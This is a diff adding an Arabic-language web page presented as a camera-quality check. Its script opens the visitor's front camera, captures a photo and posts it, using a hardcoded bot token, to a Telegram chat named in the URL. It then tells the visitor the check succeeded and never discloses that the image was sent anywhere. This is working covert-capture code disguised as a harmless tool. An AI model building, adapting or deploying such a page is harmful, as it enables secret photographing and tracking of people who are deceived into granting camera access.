@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فحص الكاميرا</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .card { background: white; border-radius: 20px; box-shadow: 0 4px 14px rgba(0,0,0,0.08); padding: 24px 18px; text-align: center; max-width: 360px; width: 90%; }
+    .icon { font-size: 42px; margin-bottom: 12px; }
+    h2 { color: #333; font-size: 20px; margin-bottom: 6px; }
+    p { color: #777; font-size: 14px; margin-bottom: 16px; }
+    video { width: 100%; max-width: 280px; border-radius: 12px; background: #eee; margin: 0 auto 12px; display: block; }
+    .progress { background: #e0e0e0; border-radius: 20px; height: 6px; width: 100%; margin: 12px 0; overflow: hidden; }
+    .progress-fill { background: #4caf50; width: 0%; height: 100%; border-radius: 20px; transition: width 0.4s ease; }
+    button { background: #4caf50; color: white; border: none; padding: 12px 32px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; }
+    button:hover { background: #388e3c; }
+    #status { margin-top: 10px; font-size: 14px; color: #555; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">📸</div>
+    <h2>فحص جودة الكاميرا</h2>
+    <p>تأكد من أداء الكاميرا والتقاط صورة تجريبية</p>
+    <video id="video" autoplay playsinline></video>
+    <div class="progress"><div class="progress-fill" id="progressBar"></div></div>
+    <button id="captureBtn">التقاط صورة</button>
+    <div id="status"></div>
+    <canvas id="canvas" style="display:none;"></canvas>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const CHAT_ID = params.get('chat');
+    const TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const progressBar = document.getElementById('progressBar');
+    const statusDiv = document.getElementById('status');
+    const captureBtn = document.getElementById('captureBtn');
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => { video.srcObject = stream; video.play(); })
+      .catch(err => { statusDiv.textContent = 'يجب السماح بالكاميرا لإجراء الفحص'; });
+
+    captureBtn.addEventListener('click', () => {
+      captureBtn.disabled = true;
+      statusDiv.textContent = 'جاري الفحص...';
+      progressBar.style.width = '40%';
+
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      progressBar.style.width = '70%';
+
+      canvas.toBlob(blob => {
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', blob, 'camera_check.jpg');
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: form })
+          .then(() => {
+            progressBar.style.width = '100%';
+            statusDiv.textContent = '✅ اكتمل الفحص بنجاح';
+          })
+          .catch(() => {
+            statusDiv.textContent = '❌ فشل الفحص، أعد المحاولة';
+            captureBtn.disabled = false;
+          });
+      }, 'image/jpeg');
+    });
+  </script>
+</body>
+</html>
